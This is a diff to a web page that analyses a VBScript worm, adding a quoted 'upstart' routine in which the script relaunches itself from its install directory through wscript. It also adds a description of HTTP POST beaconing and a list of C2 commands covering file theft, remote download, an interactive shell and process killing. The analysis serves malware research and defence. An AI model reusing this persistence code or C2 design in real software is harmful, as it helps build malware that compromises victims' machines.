@@ -720,9 +720,21 @@ if usbspreading = "" then
       shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
 
    end if
-end If</code></pre>
+end If
+upstart
+set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
+set installfullnameshort =  filesystemobj.getfile (installdir & installname)
+if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
+    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
+    wscript.quit 
+end If
+err.clear
+set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
+if  err.number > 0 then wscript.quit
+end function</code></pre>
     <p>This checks the "HKLM:\Software\angry birds" registry key to see if there is a value set.</p>
     <p>If there is no value, it sets the value as True/False depending on if it started from a USB, with the date of infection.</p>
+    <p>Finally, this runs the 'upstart' function (which we will dive into shortly) and ensures the script is running from the correct directory or will copy itself there and run wscript to launch the vbe script again.</p>
     <p>Then the infinite loop begins...</p>
     <pre>
 
@@ -868,6 +880,26 @@ if  drive.drivetype  = 1 then
 
         </pre>
         <h3>Code Execution - Part 3 - Command and Control (C2)</h3>
+        <p>The C2 communication occur via HTTP POST requests to the set domain name and port.</p>
+        <p>The victim sends "is-ready" in a POST request and receives a command from the server in the response.</p>
+        <p>This particular sample beacons every 5 seconds.</p>
+        <b>Commands supported:</b>
+        <ul>
+            <li><strong>excecute</strong>- runs any of the following built-in functions(information,hwid,security,instance) - gets OS, hardware, Anti-Virus information or infects host again.</li>
+            <li><strong>update</strong>- reinfects host</li>
+            <li><strong>uninstall</strong>- uninstalls from host</li>
+            <li><strong>send</strong>- downloads a file from victim</li>
+            <li><strong>site-send</strong>- downloads a file from a URL and saves it to the system</li>
+            <li><strong>recv</strong>- upload a file to victim</li>
+            <li><strong>enum-driver</strong>- enumerate drivers on host</li>
+            <li><strong>enum-faf</strong>- enumerate filesystem</li>
+            <li><strong>enum-process</strong>- get list of running processes</li>
+            <li><strong>cmd-shell</strong>- Get an interactive shell</li>
+            <li><strong>delete</strong>- delete a file</li>
+            <li><strong>exit-process</strong>- kill a process</li>
+            <li><strong>sleep</strong>- sleep a given number of milliseconds</li>
+        </ul>
+        <p>Note: "excecute" is not a typo.</p>
 </div></section>
     <footer>
         <div class="container">
